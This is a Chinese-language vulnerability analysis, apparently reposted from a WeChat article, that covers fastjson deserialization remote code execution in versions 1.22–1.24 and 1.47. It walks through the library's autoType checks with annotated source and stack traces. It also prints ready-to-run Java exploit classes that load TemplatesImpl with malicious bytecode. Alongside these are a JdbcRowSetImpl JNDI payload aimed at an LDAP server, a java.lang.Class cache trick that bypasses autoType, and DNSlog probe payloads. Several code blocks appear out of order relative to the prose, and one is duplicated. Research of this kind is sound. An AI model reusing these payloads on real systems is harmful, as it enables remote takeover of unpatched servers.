\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/cCUYMiPsJnqHHdKHUno6UA)

fastjson 1.22-1.24

fastjson 对于数据的处理有点绕，没有从一到底的堆栈显示，只能一步一步的跟，首先列出 exp：

```
public class rce\_22 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }

        String result = Base64.encodeBase64String(bos.toByteArray());

        return result;
    }

    public static void rce\_22() {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        String evil\_path = "D:\\\\Class\_Folder\\\\fastjson\\\\target\\\\classes\\\\com\\\\fastjson\\\\demo\\\\evilClass.class";
        String evil\_code = readClass(evil\_path);

        final String NASTY\_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        String text1 = "{\\"@type\\":\\"" + NASTY\_CLASS +
                "\\",\\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                "'\_name':'a.b'," +
                "'\_tfactory':{ }," +
                "\\"\_outputProperties\\":{ }}\\n";
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    }

    public static void main(String args\[\]) {
        rce\_22();
    }
}
```

```
parse:1311, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:624, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:302, JSON (com.alibaba.fastjson)
rce\_22:44, rce\_22 (com.fastjson.demo)

main:48, rce\_22 (com.fastjson.demo)
```

`JSONScanner`将 JSON 数据扫描后，生成`lexer`对 JSON 数据打`token`标签，最后赋值到`DefaultJSONParser`方法中，生成`DefaultJSONParser`对象，为了更好理解`token`标签的含义，我用表格列出来

<table><thead><tr><th>&nbsp; token</th><th>字符</th></tr></thead><tbody><tr><td>1</td><td>error</td></tr><tr><td>2</td><td>int</td></tr><tr><td>3</td><td>float</td></tr><tr><td>4</td><td>string</td></tr><tr><td>5</td><td>iso8601</td></tr><tr><td>6</td><td>true</td></tr><tr><td>7</td><td>false</td></tr><tr><td>8</td><td>null</td></tr><tr><td>9</td><td>new</td></tr><tr><td>10</td><td>(</td></tr><tr><td>11</td><td>)</td></tr><tr><td>12</td><td>{</td></tr><tr><td>13</td><td>}</td></tr><tr><td>14</td><td>[</td></tr><tr><td>15</td><td>]</td></tr><tr><td>16</td><td>,</td></tr><tr><td>17</td><td>:</td></tr><tr><td>18</td><td>ident</td></tr><tr><td>19</td><td>fieldName</td></tr><tr><td>20</td><td>EOF</td></tr><tr><td>21</td><td>Set</td></tr><tr><td>22</td><td>TreeSet</td></tr><tr><td>23</td><td>undefined</td></tr></tbody></table>

赋值完 token 之后，调用`DefaultJSONParser.parseObject(Type type, Object fieldName)`，当 token 等于 12 时，会创建一个`JSONObject`对象，再次返回调用`DefaultJSONParser.parseObject(Map object, Object fieldName)`，具体如何创建的我就不写了，与此漏洞关系不大，但是为了更好分析贴出堆栈图

```
public static Class<?> loadClass(String className, ClassLoader classLoader) {
        if (className != null && className.length() != 0) {
            Class<?> clazz = (Class)mappings.get(className);
            if (clazz != null) {
                return clazz;
            } else if (className.charAt(0) == '\[') {
                Class<?> componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            } else if (className.startsWith("L") && className.endsWith(";")) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            } else {
                try {
                    if (classLoader != null) {
                        clazz = classLoader.loadClass(className);
                        mappings.put(className, clazz);
                        return clazz;
                    }
                } catch (Throwable var6) {
                    var6.printStackTrace();
                }

                try {
                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
                    if (contextClassLoader != null) {
                        clazz = contextClassLoader.loadClass(className);
                        mappings.put(className, clazz);
                        return clazz;
                    }
                } catch (Throwable var5) {
                }

                try {
                    clazz = Class.forName(className);
                    mappings.put(className, clazz);
                    return clazz;
                } catch (Throwable var4) {
                    return clazz;
                }
            }
        } else {
            return null;
        }
    }
```

```
for (Method method : clazz.getMethods()) { // getter methods
            String methodName = method.getName();
            if (methodName.length() < 4) {
                continue;
            }
            //method长度大于等于4，非静态
            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }
            //method以get开头第4个字母为大写，无参构造
            if (builderClass == null && methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3))) {
                if (method.getParameterTypes().length != 0) {
                    continue;
                }
            //method返回类型继承自Collection，Map，AtomicBoolean，AtomicInteger，AtomicLong
                if (Collection.class.isAssignableFrom(method.getReturnType()) //
                        || Map.class.isAssignableFrom(method.getReturnType()) //
                        || AtomicBoolean.class == method.getReturnType() //
                        || AtomicInteger.class == method.getReturnType() //
                        || AtomicLong.class == method.getReturnType() //
                        )
```

接下来接着对 token 值判断，`lexer.scanSymbol(this.symbolTable, '"')`取出 key 为 @type，接着取出值对应赋值给`ref`，接下来运行到`TypeUtils.loadClass(ref,this.config.getDefaultClassLoader())`，此处为重点，也是之后漏洞修补的地方，贴出代码图

```
for (Method method : builderClass.getMethods()) {
                //method不为静态方法
                if (Modifier.isStatic(method.getModifiers())) {
                    continue;
                }
                //method返回值为当前类
                if (!(method.getReturnType().equals(builderClass))) {
                    continue;
                }
                ······
                String methodName = method.getName();
                StringBuilder properNameBuilder;
                //method以set开头，长度大于3
                if (methodName.startsWith("set") && methodName.length() > 3) {
                    properNameBuilder = new StringBuilder(methodName.substring(3));
                ······
                 // support builder set
            Class<?> returnType = method.getReturnType();
                 //method返回为void或者返回不为method类
            if (!(returnType.equals(Void.TYPE) || returnType.equals(method.getDeclaringClass()))) {
                continue;
            }
                //method类不为Object类
            if (method.getDeclaringClass() == Object.class) {
                continue;
            }

            Class<?>\[\] types = method.getParameterTypes();
                //method参数个数为1
            if (types.length == 0 || types.length > 2) {
                continue;
            }
```

```
build:130, JavaBeanInfo (com.alibaba.fastjson.util)
createJavaBeanDeserializer:522, ParserConfig (com.alibaba.fastjson.parser)
getDeserializer:457, ParserConfig (com.alibaba.fastjson.parser)
getDeserializer:312, ParserConfig (com.alibaba.fastjson.parser)
parseObject:354, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1312, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:624, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:302, JSON (com.alibaba.fastjson)
rce\_22:44, rce\_22 (com.fastjson.demo)
main:48, rce\_22 (com.fastjson.demo)
```

可以看到对 classname 进行的判断，L、;、\[，这些字符会在之后说明，此方法会将传入的 classname 实现为对象并放在 mappings 中，并返回 clazz，接着`this.config.getDeserializer(clazz)`解析为`JavaBeanDeserializer`对象，其中有个重要的方法为`build`，通过`github`官方源码，可以观察到默认调用的方法及条件

满足条件的 getter:

```
public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map<String, Object> fieldValues) {
        JSONLexer lexer = parser.lexer;
        FieldDeserializer fieldDeserializer = this.smartMatch(key);
        int mask = Feature.SupportNonPublicField.mask;
        if (fieldDeserializer == null && (parser.lexer.isEnabled(mask) || (this.beanInfo.parserFeatures & mask) != 0)) {
            if (this.extraFieldDeserializers == null) {
                ConcurrentHashMap extraFieldDeserializers = new ConcurrentHashMap(1, 0.75F, 1);
                Field\[\] fields = this.clazz.getDeclaredFields();
                Field\[\] var11 = fields;
                int var12 = fields.length;

                for(int var13 = 0; var13 < var12; ++var13) {
                    Field field = var11\[var13\];
                    String fieldName = field.getName();
                    if (this.getFieldDeserializer(fieldName) == null) {
                        int fieldModifiers = field.getModifiers();
                        if ((fieldModifiers & 16) == 0 && (fieldModifiers & 8) == 0) {
                            //判断是否是final与static字段，是则不放入map中
                            extraFieldDeserializers.put(fieldName, field);
                        }
                    }
                }

                this.extraFieldDeserializers = extraFieldDeserializers;
            }

            Object deserOrField = this.extraFieldDeserializers.get(key);
            if (deserOrField != null) {
                if (deserOrField instanceof FieldDeserializer) {
                    fieldDeserializer = (FieldDeserializer)deserOrField;
                } else {
                    Field field = (Field)deserOrField;
                    field.setAccessible(true);
                    FieldInfo fieldInfo = new FieldInfo(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, 0, 0, 0);
                    fieldDeserializer = new DefaultFieldDeserializer(parser.getConfig(), this.clazz, fieldInfo);
                    this.extraFieldDeserializers.put(key, fieldDeserializer);
                }
            }
        }

        if (fieldDeserializer == null) {
            if (!lexer.isEnabled(Feature.IgnoreNotMatch)) {
                throw new JSONException("setter not found, class " + this.clazz.getName() + ", property " + key);
            } else {
                parser.parseExtra(object, key);
                return false;
            }
        } else {
            lexer.nextTokenWithColon(((FieldDeserializer)fieldDeserializer).getFastMatchToken());
            ((FieldDeserializer)fieldDeserializer).parseField(parser, object, objectType, fieldValues);
            return true;
        }
    }
```

```
public void setValue(Object object, Object value) {
        if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) {
            try {
                //判断clazz类中传入声明字段是否属性为方法
                Method method = this.fieldInfo.method;
                if (method != null) {
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(method.getReturnType())) {
                            Map map = (Map)method.invoke(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)method.invoke(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else {
                        method.invoke(object, value);
                    }

                } else {
                    Field field = this.fieldInfo.field;
                    //getOnly默认为false，fieldInfo为方法且无参数时为true
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(this.fieldInfo.fieldClass)) {
                            Map map = (Map)field.get(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)field.get(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else if (field != null) {
                        //设置新的属性值
                        field.set(object, value);
                    }

                }
            } catch (Exception var6) {
                throw new JSONException("set property error, " + this.fieldInfo.name, var6);
            }
        }
    }
```

满足条件的 setter：

```
private void initDeserializers() {
        this.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);
        this.deserializers.put(Timestamp.class, SqlDateDeserializer.instance\_timestamp);
        this.deserializers.put(Date.class, SqlDateDeserializer.instance);
        this.deserializers.put(Time.class, TimeDeserializer.instance);
        this.deserializers.put(java.util.Date.class, DateCodec.instance);
        this.deserializers.put(Calendar.class, CalendarCodec.instance);
        this.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);
        this.deserializers.put(JSONObject.class, MapDeserializer.instance);
        this.deserializers.put(JSONArray.class, CollectionCodec.instance);
        this.deserializers.put(Map.class, MapDeserializer.instance);
        this.deserializers.put(HashMap.class, MapDeserializer.instance);
        this.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);
        this.deserializers.put(TreeMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);
        this.deserializers.put(Collection.class, CollectionCodec.instance);
        this.deserializers.put(List.class, CollectionCodec.instance);
        this.deserializers.put(ArrayList.class, CollectionCodec.instance);
        this.deserializers.put(Object.class, JavaObjectDeserializer.instance);
        this.deserializers.put(String.class, StringCodec.instance);
        this.deserializers.put(StringBuffer.class, StringCodec.instance);
        this.deserializers.put(StringBuilder.class, StringCodec.instance);
        this.deserializers.put(Character.TYPE, CharacterCodec.instance);
        this.deserializers.put(Character.class, CharacterCodec.instance);
        this.deserializers.put(Byte.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Byte.class, NumberDeserializer.instance);
        this.deserializers.put(Short.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Short.class, NumberDeserializer.instance);
        this.deserializers.put(Integer.TYPE, IntegerCodec.instance);
        this.deserializers.put(Integer.class, IntegerCodec.instance);
        this.deserializers.put(Long.TYPE, LongCodec.instance);
        this.deserializers.put(Long.class, LongCodec.instance);
        this.deserializers.put(BigInteger.class, BigIntegerCodec.instance);
        this.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);
        this.deserializers.put(Float.TYPE, FloatCodec.instance);
        this.deserializers.put(Float.class, FloatCodec.instance);
        this.deserializers.put(Double.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Double.class, NumberDeserializer.instance);
        this.deserializers.put(Boolean.TYPE, BooleanCodec.instance);
        this.deserializers.put(Boolean.class, BooleanCodec.instance);
        this.deserializers.put(Class.class, MiscCodec.instance);
        this.deserializers.put(char\[\].class, new CharArrayCodec());
        this.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);
        this.deserializers.put(AtomicInteger.class, IntegerCodec.instance);
        this.deserializers.put(AtomicLong.class, LongCodec.instance);
        this.deserializers.put(AtomicReference.class, ReferenceCodec.instance);
        this.deserializers.put(WeakReference.class, ReferenceCodec.instance);
        this.deserializers.put(SoftReference.class, ReferenceCodec.instance);
        this.deserializers.put(UUID.class, MiscCodec.instance);
        this.deserializers.put(TimeZone.class, MiscCodec.instance);
        this.deserializers.put(Locale.class, MiscCodec.instance);
        this.deserializers.put(Currency.class, MiscCodec.instance);
        this.deserializers.put(InetAddress.class, MiscCodec.instance);
        this.deserializers.put(Inet4Address.class, MiscCodec.instance);
        this.deserializers.put(Inet6Address.class, MiscCodec.instance);
        this.deserializers.put(InetSocketAddress.class, MiscCodec.instance);
        this.deserializers.put(File.class, MiscCodec.instance);
        this.deserializers.put(URI.class, MiscCodec.instance);
        this.deserializers.put(URL.class, MiscCodec.instance);
        this.deserializers.put(Pattern.class, MiscCodec.instance);
        this.deserializers.put(Charset.class, MiscCodec.instance);
        this.deserializers.put(JSONPath.class, MiscCodec.instance);
        this.deserializers.put(Number.class, NumberDeserializer.instance);
        this.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);
        this.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);
        this.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);
        this.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(JSONPObject.class, new JSONPDeserializer());
    }
```

```
{
    "rand1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "rand2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://localhost:1389/Object", 
        "autoCommit": true
    }
}
```

接着贴出堆栈图，用于理解如何调用到方法，为何会调用

```
public class rce\_47 {
    public static void main(String\[\] args) {
        String evil\_path = "D:\\\\Class\_Folder\\\\fastjson\\\\target\\\\classes\\\\com\\\\fastjson\\\\demo\\\\evilClass.class";
        rce\_22 rce = new rce\_22();
        String evil\_code = rce.readClass(evil\_path);
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"," +
                "        \\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                "        '\_name':'a.b'," +
                "        '\_tfactory':{ }," +
                "       \\"\_outputProperties\\":{ }}\\n" +
                "    }\\n" +
                "}";
        JSON.parseObject(payload, Class.class, Feature.SupportNonPublicField);
    }
}
```

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        if (typeName == null) {
            return null;
        } else {
            if (this.autoTypeCheckHandlers != null) {
                Iterator var4 = this.autoTypeCheckHandlers.iterator();

                while(var4.hasNext()) {
                    ParserConfig.AutoTypeCheckHandler h = (ParserConfig.AutoTypeCheckHandler)var4.next();
                    Class<?> type = h.handler(typeName, expectClass, features);
                    if (type != null) {
                        return type;
                    }
                }
            }

            int safeModeMask = Feature.SafeMode.mask;
            //开启safemode后不支持@type调用类
            boolean safeMode = this.safeMode || (features & safeModeMask) != 0 || (JSON.DEFAULT\_PARSER\_FEATURE & safeModeMask) != 0;
            if (safeMode) {
                throw new JSONException("safeMode not support autoType : " + typeName);
            } else if (typeName.length() < 192 && typeName.length() >= 3) {
                //配合之后白名单使用，expectClass类型限制
                boolean expectClassFlag;
                if (expectClass == null) {
                    expectClassFlag = false;
                } else if (expectClass != Object.class && expectClass != Serializable.class && expectClass != Cloneable.class && expectClass != Closeable.class && expectClass != EventListener.class && expectClass != Iterable.class && expectClass != Collection.class) {
                    expectClassFlag = true;
                } else {
                    expectClassFlag = false;
                }

                String className = typeName.replace('$', '.');
                long BASIC = -3750763034362895579L;
                long PRIME = 1099511628211L;
                long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) \* 1099511628211L;
                if (h1 == -5808493101479473382L) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else if ((h1 ^ (long)className.charAt(className.length() - 1)) \* 1099511628211L == 655701488918567152L) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else {
                    long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) \* 1099511628211L ^ (long)className.charAt(1)) \* 1099511628211L ^ (long)className.charAt(2)) \* 1099511628211L;
                    long fullHash = TypeUtils.fnv1a\_64(className);
                    boolean internalWhite = Arrays.binarySearch(INTERNAL\_WHITELIST\_HASHCODES, fullHash) >= 0;
                    long hash;
                    int mask;
                    if (this.internalDenyHashCodes != null) {
                        hash = h3;

                        for(mask = 3; mask < className.length(); ++mask) {
                            hash ^= (long)className.charAt(mask);
                            hash \*= 1099511628211L;
                            if (Arrays.binarySearch(this.internalDenyHashCodes, hash) >= 0) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }
                    }

                    Class clazz;
                    //判断typeName不在白名单内且expectClassFlag或autoTypeSupport为true
                    if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) {
                        hash = h3;

                        for(mask = 3; mask < className.length(); ++mask) {
                            hash ^= (long)className.charAt(mask);
                            hash \*= 1099511628211L;
                            //逐词比对是否在白名单内
                            if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                                if (clazz != null) {
                                    return clazz;
                                }
                            }
                            //逐词判断是否在黑名单中（这里会有很多类无法使用，例如com.sun.开头）
                            if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) < 0) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }
                    }
                    //从缓存中读取clazz
                    clazz = TypeUtils.getClassFromMapping(typeName);
                    if (clazz == null) {
                        clazz = this.deserializers.findClass(typeName);
                    }

                    if (clazz == null) {
                        clazz = (Class)this.typeMapping.get(typeName);
                    }

                    if (internalWhite) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                    }

                    if (clazz != null) {
                        //判断clazz的子类是否为expectClass
                        if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                        } else {
                            return clazz;
                        }
                    } else {
                        if (!this.autoTypeSupport) {
                            hash = h3;

                            for(mask = 3; mask < className.length(); ++mask) {
                                char c = className.charAt(mask);
                                hash ^= (long)c;
                                hash \*= 1099511628211L;
                                
                                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                                    throw new JSONException("autoType is not support. " + typeName);
                                }

                                if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                                    }

                                    return clazz;
                                }
                            }
                        }

                        boolean jsonType = false;
                        InputStream is = null;

                        try {
                            String resource = typeName.replace('.', '/') + ".class";
                            if (this.defaultClassLoader != null) {
                                is = this.defaultClassLoader.getResourceAsStream(resource);
                            } else {
                                is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
                            }

                            if (is != null) {
                                ClassReader classReader = new ClassReader(is, true);
                                TypeCollector visitor = new TypeCollector("<clinit>", new Class\[0\]);
                                classReader.accept(visitor);
                                jsonType = visitor.hasJsonType();
                            }
                        } catch (Exception var28) {
                        } finally {
                            IOUtils.close(is);
                        }

                        mask = Feature.SupportAutoType.mask;
                        boolean autoTypeSupport = this.autoTypeSupport || (features & mask) != 0 || (JSON.DEFAULT\_PARSER\_FEATURE & mask) != 0;
                        if (autoTypeSupport || jsonType || expectClassFlag) {
                            boolean cacheClass = autoTypeSupport || jsonType;
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, cacheClass);
                        }

                        if (clazz != null) {
                            if (jsonType) {
                                TypeUtils.addMapping(typeName, clazz);
                                return clazz;
                            }
                            //clazz不能为ClassLoader、DataSource和RowSet的子类
                            if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                            
                            if (expectClass != null) {
                                //expectClass为clazz的子类加入缓存
                                if (expectClass.isAssignableFrom(clazz)) {
                                    TypeUtils.addMapping(typeName, clazz);
                                    return clazz;
                                }

                                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                            }

                            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, this.propertyNamingStrategy);
                            if (beanInfo.creatorConstructor != null && autoTypeSupport) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }

                        if (!autoTypeSupport) {
                            throw new JSONException("autoType is not support. " + typeName);
                        } else {
                            if (clazz != null) {
                                TypeUtils.addMapping(typeName, clazz);
                            }

                            return clazz;
                        }
                    }
                }
            } else {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }
```

调用`deserialze`方法，接着扫描 json 数据，到下一个引号 key 为`_bytecodes`，此时`lexer.matchStat`为 true，运行到`boolean match = this.parseField(parser, key, object, type, fieldValues);`，为了更好理解，贴出对应代码图

```
{"@type":"java.net.InetAddress","val":"http://dnslog"}
{"@type":"java.net.Inet4Address","val":"http://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}
{"@type":"java.net.URL","val":"http://dnslog"}
```

```
public class rce\_22 {
    public String readClass(String cls){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try {
                IOUtils.copy(new FileInputStream(new File(cls)), bos);
            } catch (IOException e) {
                e.printStackTrace();
            }

            String result = Base64.encodeBase64String(bos.toByteArray());

            return result;
        }
    public static void rce\_22() {
            rce\_22 rce = new rce\_22();
            ParserConfig config = new ParserConfig();
            //evilClass可以参照ysoserial中对TemplatesImpl的处理
            String evil\_path = "evilClass.class";
            String evil\_code = rce.readClass(evil\_path);

            final String NASTY\_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

            String text1 = "{\\"@type\\":\\"" + NASTY\_CLASS +
                    "\\",\\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                    "'\_name':'a.b'," +
                    "'\_tfactory':{ }," +
                    "\\"\_outputProperties\\":{ }}\\n";
            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        }
    public static void main(String args\[\]) {
        rce\_22();
    }
}
public class rce\_47 {
    public static void main(String\[\] args) {
        String evil\_path = "D:\\\\Class\_Folder\\\\fastjson\\\\target\\\\classes\\\\com\\\\fastjson\\\\demo\\\\evilClass.class";
        rce\_22 rce = new rce\_22();
        String evil\_code = rce.readClass(evil\_path);
        //47也可同样利用22的方式，先进入map缓存，之后再调取，绕过autotype
        /\*
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"," +
                "        \\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                "        '\_name':'a.b'," +
                "        '\_tfactory':{ }," +
                "       \\"\_outputProperties\\":{ }}\\n" +
                "    }\\n" +
                "}";
                \*/
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.rowset.JdbcRowSetImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.rowset.JdbcRowSetImpl\\", \\n" +
                "        \\"dataSourceName\\": \\"ldap://localhost:1389/Object\\", \\n" +
                "        \\"autoCommit\\": true\\n" +
                "    }\\n" +
                "}";
        JSON.parseObject(payload, Class.class, Feature.SupportNonPublicField);

    }
}
```

第一次传入`_bytecodes`时`this.extraFieldDeserializers`为空，进入赋值阶段，获取 clazz 类中所有声明的字段，最后将名字与反射类放入 map 中，最后运行到`DefaultFieldDeserializer.parseField`方法中，`this.getFieldValueDeserilizer(parser.getConfig())`获取到当前字段的属性，例如`_bytecodes`为`ObjectArrayCodec`，接下来运行到实现抽象类`FieldDeserializer.setvalue`方法中，因为是重点分析，所以贴出所有代码，关键处写上注释

```
public void setValue(Object object, Object value) {
        if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) {
            try {
                //判断clazz类中传入声明字段是否属性为方法
                Method method = this.fieldInfo.method;
                if (method != null) {
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(method.getReturnType())) {
                            Map map = (Map)method.invoke(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)method.invoke(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else {
                        method.invoke(object, value);
                    }
                } else {
                    Field field = this.fieldInfo.field;
                    //getOnly默认为false，fieldInfo为方法且无参数时为true
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(this.fieldInfo.fieldClass)) {
                            Map map = (Map)field.get(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)field.get(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else if (field != null) {
                        //设置新的属性值
                        field.set(object, value);
                    }
                }
            } catch (Exception var6) {
                throw new JSONException("set property error, " + this.fieldInfo.name, var6);
            }
        }
    }
```

